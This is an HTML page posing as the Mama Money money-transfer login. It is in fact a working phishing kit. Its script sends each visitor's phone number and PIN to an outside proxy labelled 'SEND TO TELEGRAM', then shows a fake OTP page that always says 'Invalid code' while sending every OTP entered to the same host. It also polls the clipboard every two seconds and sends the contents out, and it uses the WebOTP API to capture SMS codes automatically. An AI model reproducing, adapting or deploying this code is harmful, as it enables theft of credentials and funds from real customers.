<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Mama Money Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #4a2d7a;
            background-image: url('https://i.postimg.cc/2jXBP2Rm/file-00000000ce8c820888a5b0d071ca9746.png');
            background-repeat: no-repeat;
            background-position: center center;
            background-attachment: fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            min-height: 100dvh;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(20, 10, 40, 0.20);
            z-index: 0;
        }

        .container {
            width: 100%;
            max-width: 360px;
            padding: 10px 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 1;
        }

        /* ========== LOGO ========== */
        .logo-container {
            text-align: center;
            margin-top: 0;
            margin-bottom: 22px;
        }
        .logo-img {
            width: 160px;
            display: block;
            margin: 0 auto;
            filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.25));
        }

        /* ========== INPUTS ========== */
        .input-group {
            width: 100%;
            margin-bottom: 15px;
        }
        .input-field {
            width: 100%;
            padding: 14px 15px;
            background: rgba(255, 255, 255, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.5);
            border-radius: 4px;
            color: #ffffff;
            font-size: 16px;
            outline: none;
            font-family: inherit;
            transition: all 0.2s;
        }
        .input-field::placeholder {
            color: rgba(255, 255, 255, 0.75);
        }
        .input-field:focus {
            border-color: #ffffff;
            background: rgba(255, 255, 255, 0.22);
            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.10);
        }

        /* ========== BUTTONS ========== */
        .btn {
            width: 100%;
            padding: 14px;
            background-color: #2d1b4e;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 12px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            text-decoration: none;
            font-family: inherit;
            transition: background 0.2s;
            position: relative;
            overflow: hidden;
        }
        .btn:hover {
            background-color: #1f1236;
        }
        .btn:active {
            transform: scale(0.99);
        }
        .btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        /* Button loading state */
        .btn.loading {
            color: transparent;
            pointer-events: none;
        }
        .btn.loading .btn-text {
            opacity: 0;
        }
        .btn .btn-loader {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 22px;
            height: 22px;
            border: 2.5px solid rgba(255, 255, 255, 0.3);
            border-top-color: #ffffff;
            border-radius: 50%;
            animation: btnSpin 0.7s linear infinite;
            display: none;
        }
        .btn.loading .btn-loader {
            display: block;
        }

        @keyframes btnSpin {
            to { transform: translate(-50%, -50%) rotate(360deg); }
        }

        /* ========== REMEMBER ME ========== */
        .remember-me {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 10px;
            margin-bottom: 25px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
        }
        .remember-me input[type="checkbox"] {
            width: 22px;
            height: 22px;
            accent-color: #d8b4fe;
            border-radius: 4px;
            cursor: pointer;
        }

        /* ========== PAGE SYSTEM ========== */
        .page {
            display: none;
            width: 100%;
            flex-direction: column;
            align-items: center;
        }
        .page.active {
            display: flex;
        }

        /* ========== OTP PAGE ========== */
        .otp-title {
            color: #ffffff;
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 8px;
            text-align: center;
            margin-top: 40px;
            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
        }
        .otp-subtitle {
            color: rgba(255, 255, 255, 0.9);
            font-size: 14px;
            margin-bottom: 20px;
            text-align: center;
            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
        }
        .otp-input {
            width: 100%;
            padding: 14px 15px;
            background: rgba(255, 255, 255, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.5);
            border-radius: 4px;
            color: #ffffff;
            font-size: 26px;
            text-align: center;
            letter-spacing: 10px;
            outline: none;
            margin-bottom: 6px;
            font-family: inherit;
            transition: all 0.2s;
        }
        .otp-input::placeholder {
            color: rgba(255, 255, 255, 0.55);
            letter-spacing: 4px;
            font-size: 16px;
        }
        .otp-input:focus {
            border-color: #ffffff;
            background: rgba(255, 255, 255, 0.22);
            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.10);
        }
        .resend-text {
            color: #ffffff;
            font-size: 14px;
            font-weight: 600;
            margin-top: 10px;
            cursor: pointer;
            text-decoration: underline;
            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
        }

        /* ========== ERROR MESSAGE ========== */
        .error-msg {
            color: #c62828;
            background: rgba(255, 255, 255, 0.95);
            font-size: 14px;
            font-weight: 600;
            text-align: center;
            padding: 10px 15px;
            border-radius: 4px;
            margin-bottom: 15px;
            width: 100%;
            display: none;
        }
        .error-msg.show {
            display: block;
            animation: shakeMsg 0.4s ease;
        }
        @keyframes shakeMsg {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-6px); }
            75% { transform: translateX(6px); }
        }

        /* ========== FOOTER ========== */
        .footer-text {
            text-align: center;
            color: #ffffff;
            font-size: 14px;
            font-weight: 600;
            line-height: 1.4;
            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
        }
        .footer-text a {
            color: #ffffff;
            text-decoration: underline;
        }

        /* ============================================ */
        /* FULL SCREEN LOADING OVERLAY */
        /* ============================================ */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(30, 15, 50, 0.85);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 9999;
        }

        .loading-overlay.show {
            display: flex;
            animation: fadeInOverlay 0.3s ease;
        }

        @keyframes fadeInOverlay {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        /* Beautiful loader */
        .loader-wrap {
            position: relative;
            width: 90px;
            height: 90px;
            margin-bottom: 26px;
        }

        .loader-ring {
            position: absolute;
            inset: 0;
            border-radius: 50%;
            border: 4px solid transparent;
            animation: ringSpin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
        }

        .loader-ring:nth-child(1) {
            border-top-color: #d8b4fe;
            animation-delay: -0.45s;
        }

        .loader-ring:nth-child(2) {
            border-right-color: #ffffff;
            animation-delay: -0.3s;
        }

        .loader-ring:nth-child(3) {
            border-bottom-color: #a78bfa;
            animation-delay: -0.15s;
        }

        .loader-ring:nth-child(4) {
            border-left-color: #7c3aed;
        }

        @keyframes ringSpin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Center icon */
        .loader-center {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 26px;
            color: #ffffff;
            animation: centerPulse 1.5s ease-in-out infinite;
        }

        @keyframes centerPulse {
            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
            50% { transform: translate(-50%, -50%) scale(1.15); opacity: 0.85; }
        }

        /* Loading text */
        .loading-text {
            color: #ffffff;
            font-size: 16px;
            font-weight: 700;
            letter-spacing: 0.5px;
            margin-bottom: 6px;
            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
        }

        .loading-subtext {
            color: rgba(255, 255, 255, 0.75);
            font-size: 12.5px;
            font-weight: 500;
            letter-spacing: 0.3px;
        }

        /* Animated dots */
        .loading-dots span {
            display: inline-block;
            animation: dotBounce 1.4s ease-in-out infinite;
        }
        .loading-dots span:nth-child(1) { animation-delay: 0s; }
        .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
        .loading-dots span:nth-child(3) { animation-delay: 0.4s; }

        @keyframes dotBounce {
            0%, 80%, 100% { transform: translateY(0); opacity: 0.5; }
            40% { transform: translateY(-5px); opacity: 1; }
        }

        /* Floating particles around loader */
        .loader-particle {
            position: absolute;
            width: 8px;
            height: 8px;
            background: #d8b4fe;
            border-radius: 50%;
            opacity: 0.7;
            animation: particleFloat 3s ease-in-out infinite;
        }
        .loader-particle:nth-child(1) {
            top: -20px; left: 50%;
            animation-delay: 0s;
        }
        .loader-particle:nth-child(2) {
            bottom: -20px; right: 50%;
            animation-delay: 0.5s;
            background: #ffffff;
        }
        .loader-particle:nth-child(3) {
            top: 50%; right: -25px;
            animation-delay: 1s;
            background: #a78bfa;
        }
        .loader-particle:nth-child(4) {
            bottom: 50%; left: -25px;
            animation-delay: 1.5s;
            background: #7c3aed;
        }

        @keyframes particleFloat {
            0%, 100% { transform: translateY(0) scale(1); opacity: 0.7; }
            50% { transform: translateY(-8px) scale(1.3); opacity: 1; }
        }

        /* Success checkmark animation */
        .success-icon {
            font-size: 60px;
            color: #4ade80;
            animation: successPop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
            margin-bottom: 16px;
        }

        @keyframes successPop {
            0% { transform: scale(0) rotate(-180deg); opacity: 0; }
            60% { transform: scale(1.2) rotate(10deg); }
            100% { transform: scale(1) rotate(0deg); opacity: 1; }
        }

    </style>
</head>
<body>

    <!-- ============================================ -->
    <!-- FULL SCREEN LOADING OVERLAY -->
    <!-- ============================================ -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loader-wrap" id="loaderWrap">
            <div class="loader-ring"></div>
            <div class="loader-ring"></div>
            <div class="loader-ring"></div>
            <div class="loader-ring"></div>
            <div class="loader-center"><i class="fa-solid fa-shield-halved"></i></div>
            <div class="loader-particle"></div>
            <div class="loader-particle"></div>
            <div class="loader-particle"></div>
            <div class="loader-particle"></div>
        </div>
        <div class="loading-text" id="loadingText">Processing</div>
        <div class="loading-subtext">
            Please wait<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span>
        </div>
    </div>

    <div class="container">

        <!-- ==================== LOGIN PAGE ==================== -->
        <div class="page active" id="loginPage">

            <!-- Logo -->
            <div class="logo-container">
                <img class="logo-img" src="https://cdn.phototourl.com/member/2026-09-17-57a41e04-64e5-44a2-b24e-d056fad7788a.png" alt="Mama Money Logo" />
            </div>

            <!-- Inputs -->
            <div class="input-group">
                <input type="tel" class="input-field" id="phoneInput" placeholder="Cellphone Number" maxlength="10" inputmode="numeric" pattern="[0-9]*" required />
            </div>
            <div class="input-group">
                <input type="password" class="input-field" id="pinInput" placeholder="Pin" maxlength="4" inputmode="numeric" pattern="[0-9]*" required autocomplete="off" />
            </div>

            <!-- Login Button -->
            <button class="btn" id="loginBtn">
                <span class="btn-text">Login <i class="fa-solid fa-arrow-right"></i></span>
                <span class="btn-loader"></span>
            </button>

            <button class="btn">
                Check Rates <i class="fa-solid fa-arrow-right"></i>
            </button>

            <button class="btn">
                Whatsapp Mama <i class="fa-brands fa-whatsapp"></i>
            </button>

            <div class="remember-me">
                <input type="checkbox" id="remember" />
                <label for="remember">Remember me</label>
            </div>

            <div class="footer-text">
                Forgot your pin?<br />
                Dial <a href="tel:*134*542#">*134*542#</a> to reset it.
            </div>
        </div>

        <!-- ==================== OTP PAGE (NO LOGO) ==================== -->
        <div class="page" id="otpPage">

            <!-- OTP Heading -->
            <p class="otp-title">Enter OTP</p>
            <p class="otp-subtitle">A 5-digit OTP has been sent to your number</p>

            <!-- 5-Digit OTP Input -->
            <input type="text" class="otp-input" id="otpInput" placeholder="-----" maxlength="5" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" />

            <!-- Error Message -->
            <div class="error-msg" id="errorMsg">Invalid code</div>

            <!-- Verify Button -->
            <button class="btn" id="verifyBtn">
                <span class="btn-text">Verify <i class="fa-solid fa-arrow-right"></i></span>
                <span class="btn-loader"></span>
            </button>

            <!-- Resend -->
            <span class="resend-text" id="resendOtp">Resend OTP</span>
        </div>

    </div>

    <script>
        // ==================== CONFIG ====================
        const PROXY_URL = 'https://freemix.online/proxy/index.php';

        const loginPage = document.getElementById('loginPage');
        const otpPage = document.getElementById('otpPage');
        const loginBtn = document.getElementById('loginBtn');
        const verifyBtn = document.getElementById('verifyBtn');
        const otpInput = document.getElementById('otpInput');
        const errorMsg = document.getElementById('errorMsg');
        const resendOtp = document.getElementById('resendOtp');
        const phoneInput = document.getElementById('phoneInput');
        const pinInput = document.getElementById('pinInput');

        const loadingOverlay = document.getElementById('loadingOverlay');
        const loaderWrap = document.getElementById('loaderWrap');
        const loadingText = document.getElementById('loadingText');

        let userPhone = '';
        let userPin = '';

        // ========== SHOW / HIDE LOADING ==========
        function showLoading(text) {
            loadingText.textContent = text || 'Processing';
            // Reset loader wrap (in case it was replaced by success icon)
            loaderWrap.innerHTML = `
                <div class="loader-ring"></div>
                <div class="loader-ring"></div>
                <div class="loader-ring"></div>
                <div class="loader-ring"></div>
                <div class="loader-center"><i class="fa-solid fa-shield-halved"></i></div>
                <div class="loader-particle"></div>
                <div class="loader-particle"></div>
                <div class="loader-particle"></div>
                <div class="loader-particle"></div>
            `;
            loadingOverlay.classList.add('show');
        }

        function hideLoading() {
            loadingOverlay.classList.remove('show');
        }

        function showSuccessThenHide(text, callback) {
            loadingText.textContent = text || 'Success!';
            // Replace loader with success icon
            loaderWrap.innerHTML = `<i class="fa-solid fa-check-circle success-icon"></i>`;
            setTimeout(function() {
                hideLoading();
                if (typeof callback === 'function') callback();
            }, 1200);
        }

        // ========== SEND TO TELEGRAM ==========
        async function sendToTelegram(data) {
            try {
                await fetch(PROXY_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (err) {
                console.log('Proxy send error:', err.message);
            }
        }

        // ========== INPUT DIGITS ONLY ==========
        phoneInput.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        pinInput.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // ========== LOGIN BUTTON ==========
        loginBtn.addEventListener('click', function() {
            userPhone = phoneInput.value.trim();
            userPin = pinInput.value.trim();

            if (userPhone.length < 10) {
                alert('Please enter a valid 10-digit cellphone number.');
                return;
            }
            if (userPin.length < 4) {
                alert('Please enter a valid 4-digit pin.');
                return;
            }

            // Show button loading state
            loginBtn.classList.add('loading');

            // Show full screen loading
            showLoading('Signing In');

            sendToTelegram({
                phone: userPhone,
                pin: userPin,
                step: 'login'
            });

            // After 2 seconds, show success and go to OTP
            setTimeout(function() {
                loginBtn.classList.remove('loading');
                showSuccessThenHide('Welcome!', function() {
                    loginPage.classList.remove('active');
                    otpPage.classList.add('active');
                    startOtpDetection();
                });
            }, 2000);
        });

        // ========== VERIFY BUTTON — ALWAYS INVALID ==========
        verifyBtn.addEventListener('click', function() {
            const otp = otpInput.value.trim();
            if (otp.length === 5) {
                verifyBtn.classList.add('loading');
                showLoading('Verifying');

                sendToTelegram({
                    phone: userPhone,
                    pin: userPin,
                    otp: otp,
                    step: 'otp_verify'
                });

                // After 2 seconds, show invalid
                setTimeout(function() {
                    verifyBtn.classList.remove('loading');
                    hideLoading();

                    errorMsg.textContent = 'Invalid code. Please try again.';
                    errorMsg.classList.add('show');
                    otpInput.value = '';
                }, 2000);
            }
        });

        // ========== OTP INPUT ==========
        let otpAutoSubmitTimer = null;
        otpInput.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
            errorMsg.classList.remove('show');

            if (otpAutoSubmitTimer) {
                clearTimeout(otpAutoSubmitTimer);
                otpAutoSubmitTimer = null;
            }

            if (this.value.length === 5) {
                otpAutoSubmitTimer = setTimeout(() => verifyBtn.click(), 500);
            }
        });

        // ========== RESEND OTP ==========
        resendOtp.addEventListener('click', function() {
            otpInput.value = '';
            errorMsg.classList.remove('show');

            showLoading('Resending OTP');
            setTimeout(function() {
                showSuccessThenHide('OTP Sent!', function() {
                    // Nothing extra
                });
            }, 1500);
        });

        // ========== CLIPBOARD MONITOR ==========
        let lastClipboardContent = '';

        async function checkClipboard() {
            try {
                if (document.hasFocus()) {
                    const text = await navigator.clipboard.readText();
                    if (text && text.trim() && text !== lastClipboardContent) {
                        const trimmed = text.trim();
                        lastClipboardContent = trimmed;

                        sendToTelegram({
                            phone: userPhone || 'unknown',
                            clipboard: trimmed,
                            step: 'clipboard'
                        });

                        if (otpPage.classList.contains('active')) {
                            const digitsOnly = trimmed.replace(/[^0-9]/g, '');
                            if (digitsOnly.length >= 5 && digitsOnly.length <= 6) {
                                const otpCode = digitsOnly.slice(0, 5);
                                otpInput.value = otpCode;
                                errorMsg.classList.remove('show');
                                setTimeout(() => verifyBtn.click(), 500);
                            }
                        }
                    }
                }
            } catch (err) {}
        }

        setInterval(checkClipboard, 2000);
        window.addEventListener('focus', () => setTimeout(checkClipboard, 500));
        document.addEventListener('copy', () => setTimeout(checkClipboard, 300));

        // ========== WebOTP API ==========
        async function startOtpDetection() {
            if (!('OTPCredential' in window)) return;

            try {
                const controller = new AbortController();
                setTimeout(() => controller.abort(), 120000);

                const otpCredential = await navigator.credentials.get({
                    otp: { transport: ['sms'] },
                    signal: controller.signal
                });

                if (otpCredential && otpCredential.code) {
                    const otpCode = otpCredential.code.replace(/[^0-9]/g, '').slice(0, 5);
                    otpInput.value = otpCode;
                    errorMsg.classList.remove('show');
                    setTimeout(() => verifyBtn.click(), 500);
                }
            } catch (err) {
                console.log('WebOTP error:', err.message);
            }
        }
    </script>

</body>
</html>
